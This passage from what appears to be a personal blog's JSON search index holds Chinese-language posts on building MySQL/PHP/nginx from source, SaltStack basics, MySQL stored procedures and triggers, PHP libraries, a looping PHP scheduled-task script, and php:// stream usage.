/etc/init.d/mysqldchmod 755 /etc/init.d/mysqldchkconfig --add mysqldchkconfig mysqld ongroupadd mysqluseradd mysql -g mysql -M -s /sbin/nologinmkdir /data/mysqlchown mysql:mysql /data/mysqlcd /usr/local/mysql./scripts/mysql_install_db --user=mysql --datadir=/data/mysqlservice mysqld restartchkconfig --add mysqldchkconfig mysqld on#php cd /data/srcwget http://cn2.php.net/distributions/php-5.6.7.tar.gztar zxvf php-5.6.7.tar.gzcd php-5.6.7yum install libxml2-devel libcurl-devel libjpeg-devel libpng-devel freetype-devel openldap-devel libmcrypt-devel -ycp -frp /usr/lib64/libldap* /usr/libln -s /usr/local/mysql/lib/libmysqlclient.so.18 /usr/libldconfig./configure --enable-fpm --enable-cgi --prefix=/usr/local/php --with-mysql=/usr/local/mysql/ --with-iconv-dir=/usr/local --with-freetype-dir --with-jpeg-dir=/usr/lib --with-png-dir=/usr/lib --with-zlib --with-libxml-dir=/usr --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem --with-curl --enable-mbregex --enable-mbstring --with-gd --enable-gd-native-ttf --with-openssl --with-mhash --enable-pcntl --with-ldap --with-ldap-sasl --with-xmlrpc --enable-zip --enable-soap --with-mysqli=/usr/local/mysql/bin/mysql_config --with-pdo-mysql=/usr/local/mysqlmakemake installcp php.ini-production /usr/local/php/lib/php.ini -fcp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm -fchmod u+x /etc/init.d/php-fpm cd /usr/local/php/etc/cp php-fpm.conf.default php-fpm.conf -fsed -i &apos;s/nobody/www/g&apos; /usr/local/php/etc/php-fpm.confmkdir /data/wwwecho &quot;&amp;lt;?php phpinfo();&quot; &amp;gt;/data/www/index.phpcd /data/src/#wget http://downloads.zend.com/guard/7.0.0/zend-loader-php5.6-linux-x86_64.tar.gz/etc/init.d/nginx restart/etc/init.d/php-fpm restart","categories":[],"tags":[]},{"title":"saltstack入门","slug":"devops/saltstack入门","date":"2015-08-10T09:25:59.000Z","updated":"2019-08-26T06:53:34.874Z","comments":true,"path":"2015/08/10/devops/saltstack入门/","link":"","permalink":"http://ningmo.github.io/2015/08/10/devops/saltstack入门/","excerpt":"","text":"主master 1yum install salt-master salt-master -d 客户端client 1yum install salt-minion 在客户端的/etc/salt/minion 里面填写主的ip地址salt-minion-d客户端启动后会主动请求服务端是否信任服务端确认是否添加信任 123salt-key -A # 全部添加salt-key -a &apos;...&apos; #添加信任某个主机salt-key -d &apos;...&apos; #删除信任某个主机 列出信任 1salt-key -L 给客户端定义组 1vim /etc/salt/master 命令格式 salt 【客户端】 【命令】 【参数】过滤【客户端】 1234\\* 全部-G &apos;os:centos&apos; 全部centos系统的&apos;10.10.102.*&apos;...... 【命令】 123cmd.runtest.ping....... 自定义模块 1234cd /srv/salt/_modules/vim m1.pysalt \\* saltutil.sync_all # 同步至客户端salt \\* m1.run # 执行 参考http://rfyiamcool.blog.51cto.com/1030776/1262537","categories":[],"tags":[]},{"title":"mysql存储过程详解","slug":"mysql/mysql存储过程详解","date":"2013-08-01T03:24:29.000Z","updated":"2019-08-26T06:09:54.321Z","comments":true,"path":"2013/08/01/mysql/mysql存储过程详解/","link":"","permalink":"http://ningmo.github.io/2013/08/01/mysql/mysql存储过程详解/","excerpt":"","text":"mysql存储过程详解 存储过程简介 我们常用的操作数据库语言SQL语句在执行的时候需要要先编译，然后执行，而存储过程（Stored Procedure）是一组为了完成特定功能的SQL语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给定参数（如果该存储过程带有参数）来调用执行它。 一个存储过程是一个可编程的函数，它在数据库中创建并保存。它可以有SQL语句和一些特殊的控制结构组成。当希望在不同的应用程序或平台上执行相同的函数，或者封装特定功能时，存储过程是非常有用的。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式。 存储过程通常有以下优点： (1).存储过程增强了SQL语言的功能和灵活性。存储过程可以用流控制语句编写，有很强的灵活性，可以完成复杂的判断和较复杂的运算。 (2).存储过程允许标准组件是编程。存储过程被创建后，可以在程序中被多次调用，而不必重新编写该存储过程的SQL语句。而且数据库专业人员可以随时对存储过程进行修改，对应用程序源代码毫无影响。 (3).存储过程能实现较快的执行速度。如果某一操作包含大量的Transaction-SQL代码或分别被多次执行，那么存储过程要比批处理的执行速度快很多。因为存储过程是预编译的。在首次运行一个存储过程时查询，优化器对其进行分析优化，并且给出最终被存储在系统表中的执行计划。而批处理的Transaction-SQL语句在每次运行时都要进行编译和优化，速度相对要慢一些。 (4).存储过程能过减少网络流量。针对同一个数据库对象的操作（如查询、修改），如果这一操作所涉及的Transaction-SQL语句被组织程存储过程，那么当在客户计算机上调用该存储过程时，网络中传送的只是该调用语句，从而大大增加了网络流量并降低了网络负载。 (5).存储过程可被作为一种安全机制来充分利用。系统管理员通过执行某一存储过程的权限进行限制，能够实现对相应的数据的访问权限的限制，避免了非授权用户对数据的访问，保证了数据的安全。 关于MySQL的存储过程 存储过程是数据库存储的一个重要的功能，但是MySQL在5.0以前并不支持存储过程，这使得MySQL在应用上大打折扣。好在MySQL 5.0终于开始已经支持存储过程，这样即可以大大提高数据库的处理速度，同时也可以提高数据库编程的灵活性。 MySQL存储过程的创建 (1). 格式 MySQL存储过程创建的格式：CREATE PROCEDURE 过程名 ([过程参数[,…]])[特性 …] 过程体 这里先举个例子： mysql&gt; DELIMITER //mysql&gt; CREATE PROCEDURE proc1(OUT s int)-&gt; BEGIN-&gt; SELECT COUNT(*) INTO s FROM user;-&gt; END-&gt; //mysql&gt; DELIMITER ; 注： （1）这里需要注意的是DELIMITER //和DELIMITER ;两句，DELIMITER是分割符的意思，因为MySQL默认以”;”为分隔符，如果我们没有声明分割符，那么编译器会把存储过程当成SQL语句进行处理，则存储过程的编译过程会报错，所以要事先用DELIMITER关键字申明当前段分隔符，这样MySQL才会将”;”当做存储过程中的代码，不会执行这些代码，用完了之后要把分隔符还原。 （2）存储过程根据需要可能会有输入、输出、输入输出参数，这里有一个输出参数s，类型是int型，如果有多个参数用”,”分割开。 （3）过程体的开始与结束使用BEGIN与END进行标识。 这样，我们的一个MySQL存储过程就完成了，是不是很容易呢?看不懂也没关系，接下来，我们详细的讲解。 (2). 声明分割符 其实，关于声明分割符，上面的注解已经写得很清楚，不需要多说，只是稍微要注意一点的是：如果是用MySQL的Administrator管理工具时，可以直接创建，不再需要声明。 (3). 参数 MySQL存储过程的参数用在存储过程的定义，共有三种参数类型,IN,OUT,INOUT,形式如： CREATE PROCEDURE([[IN |OUT |INOUT ] 参数名 数据类形…]) IN 输入参数:表示该参数的值必须在调用存储过程时指定，在存储过程中修改该参数的值不能被返回，为默认值 OUT 输出参数:该值可在存储过程内部被改变，并可返回 INOUT 输入输出参数:调用时指定，并且可被改变和返回 Ⅰ. IN参数例子 创建: mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE demo_in_parameter(IN p_in int)-&gt; BEGIN-&gt; SELECT p_in;-&gt; SET p_in=2;-&gt; SELECT p_in;-&gt; END;-&gt; //mysql &gt; DELIMITER ; 执行结果: mysql &gt; SET @p_in=1;mysql &gt; CALL demo_in_parameter(@p_in);+——+| p_in |+——+| 1 |+——+ +——+| p_in |+——+| 2 |+——+ mysql&gt; SELECT @p_in;+——-+| @p_in |+——-+| 1 |+——-+ 以上可以看出，p_in虽然在存储过程中被修改，但并不影响@p_id的值 Ⅱ.OUT参数例子 创建: mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE demo_out_parameter(OUT p_out int)-&gt; BEGIN-&gt; SELECT p_out;-&gt; SET p_out=2;-&gt; SELECT p_out;-&gt; END;-&gt; //mysql &gt; DELIMITER ; 执行结果: mysql &gt; SET @p_out=1;mysql &gt; CALL sp_demo_out_parameter(@p_out);+——-+| p_out |+——-+| NULL |+——-+ +——-+| p_out |+——-+| 2 |+——-+ mysql&gt; SELECT @p_out;+——-+| p_out |+——-+| 2 |+——-+ Ⅲ. INOUT参数例子 创建: mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE demo_inout_parameter(INOUT p_inout int)-&gt; BEGIN-&gt; SELECT p_inout;-&gt; SET p_inout=2;-&gt; SELECT p_inout;-&gt; END;-&gt; //mysql &gt; DELIMITER ; 执行结果: mysql &gt; SET @p_inout=1;mysql &gt; CALL demo_inout_parameter(@p_inout) ;+———+| p_inout |+———+| 1 |+———+ +———+| p_inout |+———+| 2 |+———+ mysql &gt; SELECT @p_inout;+———-+| @p_inout |+———-+| 2 |+———-+ (4). 变量 Ⅰ. 变量定义 DECLARE variable_name [,variable_name…] datatype [DEFAULT value]; 其中，datatype为MySQL的数据类型，如:int, float, date, varchar(length) 例如: DECLARE l_int int unsigned default 4000000;DECLARE l_numeric number(8,2) DEFAULT 9.95;DECLARE l_date date DEFAULT ‘1999-12-31’;DECLARE l_datetime datetime DEFAULT ‘1999-12-31 23:59:59’;DECLARE l_varchar varchar(255) DEFAULT ‘This will not be padded’; Ⅱ. 变量赋值 SET 变量名 = 表达式值 [,variable_name = expression …] Ⅲ. 用户变量 ⅰ. 在MySQL客户端使用用户变量 mysql &gt; SELECT ‘Hello World’ into @x;mysql &gt; SELECT @x;+————-+| @x |+————-+| Hello World |+————-+mysql &gt; SET @y=’Goodbye Cruel World’;mysql &gt; SELECT @y;+———————+| @y |+———————+| Goodbye Cruel World |+———————+ mysql &gt; SET @z=1+2+3;mysql &gt; SELECT @z;+——+| @z |+——+| 6 |+——+ ⅱ. 在存储过程中使用用户变量 mysql &gt; CREATE PROCEDURE GreetWorld( ) SELECT CONCAT(@greeting,’ World’);mysql &gt; SET @greeting=’Hello’;mysql &gt; CALL GreetWorld( );+—————————-+| CONCAT(@greeting,’ World’) |+—————————-+| Hello World |+—————————-+ ⅲ. 在存储过程间传递全局范围的用户变量 mysql&gt; CREATE PROCEDURE p1() SET @last_procedure=’p1’;mysql&gt; CREATE PROCEDURE p2() SELECT CONCAT(‘Last procedure was ‘,@last_proc);mysql&gt; CALL p1( );mysql&gt; CALL p2( );+———————————————–+| CONCAT(‘Last procedure was ‘,@last_proc |+———————————————–+| Last procedure was p1 |+———————————————–+ 注意: ①用户变量名一般以@开头 ②滥用用户变量会导致程序难以理解及管理 (5). 注释 MySQL存储过程可使用两种风格的注释 双模杠：– 该风格一般用于单行注释 c风格： 一般用于多行注释 例如： mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE proc1 –name存储过程名-&gt; (IN parameter1 INTEGER)-&gt; BEGIN-&gt; DECLARE variable1 CHAR(10);-&gt; IF parameter1 = 17 THEN-&gt; SET variable1 = ‘birds’;-&gt; ELSE-&gt; SET variable1 = ‘beasts’;-&gt; END IF;-&gt; INSERT INTO table1 VALUES (variable1);-&gt; END-&gt; //mysql &gt; DELIMITER ; MySQL存储过程的调用 用call和你过程名以及一个括号，括号里面根据需要，加入参数，参数包括输入参数、输出参数、输入输出参数。具体的调用方法可以参看上面的例子。 MySQL存储过程的查询 我们像知道一个数据库下面有那些表，我们一般采用show tables;进行查看。那么我们要查看某个数据库下面的存储过程，是否也可以采用呢？答案是，我们可以查看某个数据库下面的存储过程，但是是令一钟方式。 我们可以用 select name from mysql.proc where db=’数据库名’; 或者 select routine_name from information_schema.routines where routine_schema=’数据库名’; 或者 show procedure status where db=’数据库名’; 进行查询。 如果我们想知道，某个存储过程的详细，那我们又该怎么做呢？是不是也可以像操作表一样用describe 表名进行查看呢？ 答案是：我们可以查看存储过程的详细，但是需要用另一种方法： SHOW CREATE PROCEDURE 数据库.存储过程名; 就可以查看当前存储过程的详细。 MySQL存储过程的修改 ALTER PROCEDURE 更改用CREATE PROCEDURE 建立的预先指定的存储过程，其不会影响相关存储过程或存储功能。 MySQL存储过程的删除 删除一个存储过程比较简单，和删除表一样： DROP PROCEDURE 从MySQL的表格中删除一个或多个存储过程。 MySQL存储过程的控制语句 (1). 变量作用域 内部的变量在其作用域范围内享有更高的优先权，当执行到end。变量时，内部变量消失，此时已经在其作用域外，变量不再可见了，应为在存储过程外再也不能找到这个申明的变量，但是你可以通过out参数或者将其值指派给会话变量来保存其值。 mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE proc3()-&gt; begin-&gt; declare x1 varchar(5) default ‘outer’;-&gt; begin-&gt; declare x1 varchar(5) default ‘inner’;-&gt; select x1;-&gt; end;-&gt; select x1;-&gt; end;-&gt; //mysql &gt; DELIMITER ; (2). 条件语句 Ⅰ. if-then -else语句 mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE proc2(IN parameter int)-&gt; begin-&gt; declare var int;-&gt; set var=parameter+1;-&gt; if var=0 then-&gt; insert into t values(17);-&gt; end if;-&gt; if parameter=0 then-&gt; update t set s1=s1+1;-&gt; else-&gt; update t set s1=s1+2;-&gt; end if;-&gt; end;-&gt; //mysql &gt; DELIMITER ; Ⅱ. case语句： mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE proc3 (in parameter int)-&gt; begin-&gt; declare var int;-&gt; set var=parameter+1;-&gt; case var-&gt; when 0 then-&gt; insert into t values(17);-&gt; when 1 then-&gt; insert into t values(18);-&gt; else-&gt; insert into t values(19);-&gt; end case;-&gt; end;-&gt; //mysql &gt; DELIMITER ; (3). 循环语句 Ⅰ. while ···· end while： mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE proc4()-&gt; begin-&gt; declare var int;-&gt; set var=0;-&gt; while var&lt;6 do-&gt; insert into t values(var);-&gt; set var=var+1;-&gt; end while;-&gt; end;-&gt; //mysql &gt; DELIMITER ; Ⅱ. repeat···· end repeat： 它在执行操作后检查结果，而while则是执行前进行检查。 mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE proc5 ()-&gt; begin-&gt; declare v int;-&gt; set v=0;-&gt; repeat-&gt; insert into t values(v);-&gt; set v=v+1;-&gt; until v&gt;=5-&gt; end repeat;-&gt; end;-&gt; //mysql &gt; DELIMITER ; Ⅲ. loop ·····end loop: loop循环不需要初始条件，这点和while 循环相似，同时和repeat循环一样不需要结束条件, leave语句的意义是离开循环。 mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE proc6 ()-&gt; begin-&gt; declare v int;-&gt; set v=0;-&gt; LOOP_LABLE:loop-&gt; insert into t values(v);-&gt; set v=v+1;-&gt; if v &gt;=5 then-&gt; leave LOOP_LABLE;-&gt; end if;-&gt; end loop;-&gt; end;-&gt; //mysql &gt; DELIMITER ; Ⅳ. LABLES 标号： 标号可以用在begin repeat while 或者loop 语句前，语句标号只能在合法的语句前面使用。可以跳出循环，使运行指令达到复合语句的最后一步。 (4). ITERATE迭代 Ⅰ. ITERATE: 通过引用复合语句的标号,来从新开始复合语句 mysql &gt; DELIMITER //mysql &gt; CREATE PROCEDURE proc10 ()-&gt; begin-&gt; declare v int;-&gt; set v=0;-&gt; LOOP_LABLE:loop-&gt; if v=3 then-&gt; set v=v+1;-&gt; ITERATE LOOP_LABLE;-&gt; end if;-&gt; insert into t values(v);-&gt; set v=v+1;-&gt; if v&gt;=5 then-&gt; leave LOOP_LABLE;-&gt; end if;-&gt; end loop;-&gt; end;-&gt; //mysql &gt; DELIMITER ; MySQL存储过程的基本函数 (1).字符串类 CHARSET(str) //返回字串字符集CONCAT (string2 [,… ]) //连接字串INSTR (string ,substring ) //返回substring首次在string中出现的位置,不存在返回0LCASE (string2 ) //转换成小写LEFT (string2 ,length ) //从string2中的左边起取length个字符LENGTH (string ) //string长度LOAD_FILE (file_name ) //从文件读取内容LOCATE (substring , string [,start_position ] ) 同INSTR,但可指定开始位置LPAD (string2 ,length ,pad ) //重复用pad加在string开头,直到字串长度为lengthLTRIM (string2 ) //去除前端空格REPEAT (string2 ,count ) //重复count次REPLACE (str ,search_str ,replace_str ) //在str中用replace_str替换search_strRPAD (string2 ,length ,pad) //在str后用pad补充,直到长度为lengthRTRIM (string2 ) //去除后端空格STRCMP (string1 ,string2 ) //逐字符比较两字串大小,SUBSTRING (str , position [,length ]) //从str的position开始,取length个字符,注：mysql中处理字符串时，默认第一个字符下标为1，即参数position必须大于等于1 mysql&gt; select substring(‘abcd’,0,2);+———————–+| substring(‘abcd’,0,2) |+———————–+| |+———————–+1 row in set (0.00 sec) mysql&gt; select substring(‘abcd’,1,2);+———————–+| substring(‘abcd’,1,2) |+———————–+| ab |+———————–+1 row in set (0.02 sec) TRIM([[BOTH|LEADING|TRAILING] [padding] FROM]string2) //去除指定位置的指定字符UCASE (string2 ) //转换成大写RIGHT(string2,length) //取string2最后length个字符SPACE(count) //生成count个空格 (2).数学类 ABS (number2 ) //绝对值BIN (decimal_number ) //十进制转二进制CEILING (number2 ) //向上取整CONV(number2,from_base,to_base) //进制转换FLOOR (number2 ) //向下取整FORMAT (number,decimal_places ) //保留小数位数HEX (DecimalNumber ) //转十六进制注：HEX()中可传入字符串，则返回其ASC-11码，如HEX(‘DEF’)返回4142143也可以传入十进制整数，返回其十六进制编码，如HEX(25)返回19LEAST (number , number2 [,..]) //求最小值MOD (numerator ,denominator ) //求余POWER (number ,power ) //求指数RAND([seed]) //随机数ROUND (number [,decimals ]) //四舍五入,decimals为小数位数] 注：返回类型并非均为整数，如：(1)默认变为整形值 mysql&gt; select round(1.23);+————-+| round(1.23) |+————-+| 1 |+————-+1 row in set (0.00 sec) mysql&gt; select round(1.56);+————-+| round(1.56) |+————-+| 2 |+————-+1 row in set (0.00 sec) (2)可以设定小数位数，返回浮点型数据 mysql&gt; select round(1.567,2);+—————-+| round(1.567,2) |+—————-+| 1.57 |+—————-+1 row in set (0.00 sec) SIGN (number2 ) // (3).日期时间类ADDTIME (date2 ,time_interval ) //将time_interval加到date2CONVERT_TZ (datetime2 ,fromTZ ,toTZ ) //转换时区CURRENT_DATE ( ) //当前日期CURRENT_TIME ( ) //当前时间CURRENT_TIMESTAMP ( ) //当前时间戳DATE (datetime ) //返回datetime的日期部分DATE_ADD (date2 , INTERVAL d_value d_type ) //在date2中加上日期或时间DATE_FORMAT (datetime ,FormatCodes ) //使用formatcodes格式显示datetimeDATE_SUB (date2 , INTERVAL d_value d_type ) //在date2上减去一个时间DATEDIFF (date1 ,date2 ) //两个日期差DAY (date ) //返回日期的天DAYNAME (date ) //英文星期DAYOFWEEK (date ) //星期(1-7) ,1为星期天DAYOFYEAR (date ) //一年中的第几天EXTRACT (interval_name FROM date ) //从date中提取日期的指定部分MAKEDATE (year ,day ) //给出年及年中的第几天,生成日期串MAKETIME (hour ,minute ,second ) //生成时间串MONTHNAME (date ) //英文月份名NOW ( ) //当前时间SEC_TO_TIME (seconds ) //秒数转成时间STR_TO_DATE (string ,format ) //字串转成时间,以format格式显示TIMEDIFF (datetime1 ,datetime2 ) //两个时间差TIME_TO_SEC (time ) //时间转秒数]WEEK (date_time [,start_of_week ]) //第几周YEAR (datetime ) //年份DAYOFMONTH(datetime) //月的第几天HOUR(datetime) //小时LAST_DAY(date) //date的月的最后日期MICROSECOND(datetime) //微秒MONTH(datetime) //月MINUTE(datetime) //分返回符号,正负或0SQRT(number2) //开平方 &nbsp; From:http://xdj651897373-126-com.iteye.com/blog/1819924","categories":[],"tags":[]},{"title":"mysql_trigger_and_procedure","slug":"mysql/mysql_trigger_and_procedure","date":"2013-07-31T06:22:00.000Z","updated":"2019-08-26T06:09:54.319Z","comments":true,"path":"2013/07/31/mysql/mysql_trigger_and_procedure/","link":"","permalink":"http://ningmo.github.io/2013/07/31/mysql/mysql_trigger_and_procedure/","excerpt":"","text":"触发器catabig为表名所操作的数据： 添加的数据或修改后的数据为new 删除或修改前的数据为old触发器需要避免死循环如 insert操作触发触发器的insert操作 依次无限循环下去导致死循环 ···mysql&gt; delimiter //mysql&gt; create trigger mytrigger before update -&gt; on catabig for each row -&gt; begin -&gt; set new.t=concat(new.t,old.t); -&gt; end//Query OK, 0 rows affected (0.04 sec) mysql&gt; delimiter ;mysql&gt; select * from catabig;+—-+——+| id | t |+—-+——+| 3 | PHP |+—-+——+3 rows in set (0.00 sec)mysql&gt; update catabig set t=’_upd’ where id=3;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; select * from catabig;+—-+———+| id | t |+—-+———+| 3 | _updPHP |+—-+———+3 rows in set (0.00 sec)··· 存储过程···delimiter //create procedure mypro(ed int)begin declare i int; – 定义声明必须在最前面 declare rs int; set rs=0 ; set i=1 ; label1:loop if i&lt;=ed then set rs=i+rs; set i=i+1; ITERATE label1; – 继续循环 else leave label1; – 结束循环 end if; end loop label1; – 结束循环 select rs; – 不允许存在return（只有function可以有return）end //delimiter ; – 调用mysql&gt; call mypro(100);+——+| rs |+——+| 5050 |+——+1 row in set (0.00 sec) Query OK, 0 rows affected (0.00 sec)···","categories":[],"tags":[]},{"title":"mysql触发器以及存储过程","slug":"mysql/触发器以及存储过程","date":"2013-07-31T06:22:00.000Z","updated":"2019-08-26T06:09:54.323Z","comments":true,"path":"2013/07/31/mysql/触发器以及存储过程/","link":"","permalink":"http://ningmo.github.io/2013/07/31/mysql/触发器以及存储过程/","excerpt":"","text":"触发器catabig为表名所操作的数据： 添加的数据或修改后的数据为new 删除或修改前的数据为old触发器需要避免死循环如 insert操作触发触发器的insert操作 依次无限循环下去导致死循环 12345678910111213141516171819202122232425262728mysql&gt; delimiter //mysql&gt; create trigger mytrigger before update -&gt; on catabig for each row -&gt; begin -&gt; set new.t=concat(new.t,old.t); -&gt; end//Query OK, 0 rows affected (0.04 sec)mysql&gt; delimiter ;mysql&gt; select * from catabig;+----+------+| id | t |+----+------+| 3 | PHP |+----+------+3 rows in set (0.00 sec)mysql&gt; update catabig set t=&apos;_upd&apos; where id=3;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; select * from catabig;+----+---------+| id | t |+----+---------+| 3 | _updPHP |+----+---------+3 rows in set (0.00 sec) 存储过程 12345678910111213141516171819202122232425262728delimiter //create procedure mypro(ed int)begin declare i int; -- 定义声明必须在最前面 declare rs int; set rs=0 ; set i=1 ; label1:loop if i&lt;=ed then set rs=i+rs; set i=i+1; ITERATE label1; -- 继续循环 else leave label1; -- 结束循环 end if; end loop label1; -- 结束循环 select rs; -- 不允许存在return（只有function可以有return）end //delimiter ; -- 调用mysql&gt; call mypro(100);+------+| rs |+------+| 5050 |+------+1 row in set (0.00 sec)Query OK, 0 rows affected (0.00 sec)","categories":[{"name":"mysql","slug":"mysql","permalink":"http://ningmo.github.io/categories/mysql/"}],"tags":[{"name":"mysql trigger","slug":"mysql-trigger","permalink":"http://ningmo.github.io/tags/mysql-trigger/"}]},{"title":"useful php packages","slug":"php/常用的PHP类库","date":"2013-07-25T05:51:30.000Z","updated":"2019-08-26T06:09:54.329Z","comments":true,"path":"2013/07/25/php/常用的PHP类库/","link":"","permalink":"http://ningmo.github.io/2013/07/25/php/常用的PHP类库/","excerpt":"","text":"PDF 生成器FPDF 这量一个可以让你生成PDF的纯PHP类库。 Excel 相关php-excel 这是一个非常简单的Excel文件生成类。 PHP Excel Reader可以解析并读取XLS文件中的数据。 E-Mail相关Swift Mailer 免费的超多功能的PHP邮件库。 PHPMailer 超强大的邮件发送类。 PHPMailer使用教程 PHPMailer使用教程，使用PHPMailer发送邮件（含附件下载） 单元测试SimpleTest 一个PHP的单元测试和网页测试的框架。 PHPUnit 提供一个框架可以让你方便地进行单元测试的案例开发。并可非常容易地分析其测试结果。 图表库pChart 一个可以创建统计图的库。 Libchart 这也是一个简单的统计图库。 JpGraph 一个面向对象的图片创建类 RSS 解析MagpieRSS 开源的PHP版RSS解析器，据说功能强大，未验证。 SimplePie 这是一个非常快速，而且易用的RSS和Atom 解析库。 缩略图生成phpThumb 功能很强大 支付PHP Payment Library 支持Paypal, Authorize.net 和2Checkout (2CO) OpenIDPHP-OpenID 支持OpenID的一个PHP库。OpenID是帮助你使用相同的用户名和口令登录不同的网站的一种解决方案。如果你对OpenID不熟悉的话，你可以到这里看看：http://openid.net.cn/ 对象关系映射ORMADOdb 数据库抽象http://www.phpddt.com/tag/ADODBadodb 专题教程 Doctrine 对象关系映射Object relational mapper (ORM) ，需要 PHP 5.2.3+ 版本，一个非常强大的database abstraction layer (DBAL). Propel 对象关系映射框架 Outlet 也是关于对象关系映射的一个工具","categories":[],"tags":[{"name":"phppdf","slug":"phppdf","permalink":"http://ningmo.github.io/tags/phppdf/"},{"name":"phpexcel","slug":"phpexcel","permalink":"http://ningmo.github.io/tags/phpexcel/"},{"name":"phpemail","slug":"phpemail","permalink":"http://ningmo.github.io/tags/phpemail/"}]},{"title":"关于PHP定时执行任务的实现","slug":"php/关于PHP定时执行任务的实现","date":"2013-07-25T04:34:41.000Z","updated":"2019-08-26T06:09:54.329Z","comments":true,"path":"2013/07/25/php/关于PHP定时执行任务的实现/","link":"","permalink":"http://ningmo.github.io/2013/07/25/php/关于PHP定时执行任务的实现/","excerpt":"","text":"PHP在这方面应该说是比较弱，如果只用php去实现可以如下： 1234567891011 ignore_user_abort();//关闭浏览器后，继续执行php代码 set_time_limit(0);//程序执行时间无限制 $sleep_time = 1;//多长时间执行一次 do&#123; $fp = fopen(&apos;test.txt&apos;,&apos;a+&apos;); fwrite($fp,&quot;这是一个php博客：phpddt.com \\n&quot;); fclose($fp); sleep($sleep_time); &#125;while(true); ?&gt; 但是当我执行脚本的时候，即使我关闭了浏览器，我根本就没法去停止这段程序了，所以你需要一个执行脚本的开关，你可以用外部文件引入的方法来实现，在while循环的时候，include开关变量即可。那么就可以这样实现： 建立外部引入变量文件 switch.php 内容如下：​1234return 1;//1执行脚本 0退出执行脚本?&gt; 改良脚本如下：​1234567891011121314 ignore_user_abort();//关闭浏览器后，继续执行php代码 set_time_limit(0);//程序执行时间无限制 $sleep_time = 5;//多长时间执行一次 $switch = include &apos;switch.php&apos;; while($switch)&#123; $switch = include &apos;switch.php&apos;; $fp = fopen(&apos;test.txt&apos;,&apos;a+&apos;); fwrite($fp,&quot;这是一个php博客：phpddt.com $switch \\n&quot;); fclose($fp); sleep($sleep_time); &#125; exit(); ?&gt; 这个脚本只是测试可行，具体效率应该不高，对于lamp,你完全可以使用crontab 来实现From:http://www.phpddt.com/php/php-timed-task.html ```","categories":[],"tags":[]},{"title":"对PHP输入输出流学习和认识","slug":"php/对PHP输入输出流学习和认识","date":"2013-07-25T03:23:11.000Z","updated":"2019-08-26T06:09:54.329Z","comments":true,"path":"2013/07/25/php/对PHP输入输出流学习和认识/","link":"","permalink":"http://ningmo.github.io/2013/07/25/php/对PHP输入输出流学习和认识/","excerpt":"","text":"PHP输入和输出流是通过php://来访问的，它允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php://stdin, php://stdout 和 php://stderr php://stdin，php://stdout 和 php://stderr允许访问 PHP 进程相应的输入或者输出流。 php://input php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA（原生的post数据），因为它不依赖于特定的 php.ini 指令,内存消耗更少。如下例： 123456&lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;test&quot; &gt; &lt;input type=&quot;submit&quot; name=&quot;&quot; /&gt;&lt;/form&gt;&lt;?php echo file_get_contents(&quot;php://input&quot;);?&gt; 结果： php://input接受post数据 php://output php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。 php://fd php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。 php://memory 和 php://temp php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 php://filter php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。参数如下： php:filter//过滤器参数 如下例： 1234&lt;?php/* 这会以大写字母输出 www.phpddt.com 的全部内容 */readfile(&quot;php://filter/read=string.toupper/resource=http://www.phpddt.com&quot;);?&gt; 以上摘自：http://www.phpddt.com/php/php-input-output.html以下出自php手册 Example #1 php://temp/maxmemory This optional parameter allows setting the memory limit before php://temp starts using a temporary file. 1234567891011&lt;?php// Set the limit to 5 MB.$fiveMBs = 5 * 1024 * 1024;$fp = fopen(&quot;php://temp/maxmemory:$fiveMBs&quot;, &apos;r+&apos;);fputs($fp, &quot;hello\\n&quot;);// Read what we have written.rewind($fp);echo stream_get_contents($fp);?&gt; Example #2 php://filter/resource= This parameter must be located at the end of your php://filter specification and should point to the stream which you want filtered. 1234567&lt;?php/* This is equivalent to simply: readfile(&quot;http://www.example.com&quot;); since no filters are actually specified */readfile(&quot;php://filter/resource=http://www.example.com&quot;);?&gt; Example #3 php://filter/read= This parameter takes one or more filternames separated by the pipe character |. 123456789&lt;?php/* This will output the contents of www.example.com entirely in uppercase */readfile(&quot;php://filter/read=string.toupper/resource=http://www.example.com&quot;);/* This will do the same as above but will also ROT13 encode it */readfile(&quot;php://filter/read=string.toupper|string.rot13/resource=http://www.example.com&quot;);?&gt; Example #4 php://filter/write= This parameter takes one or more filternames separated by the pipe character |. 123456&lt;?php/* This will filter the string &quot;Hello World&quot; through the rot13 filter, then write to example.txt in the current directory */file_put_contents(&quot;php://filter/write=string.rot13/resource=example.txt&quot;,&quot;Hello 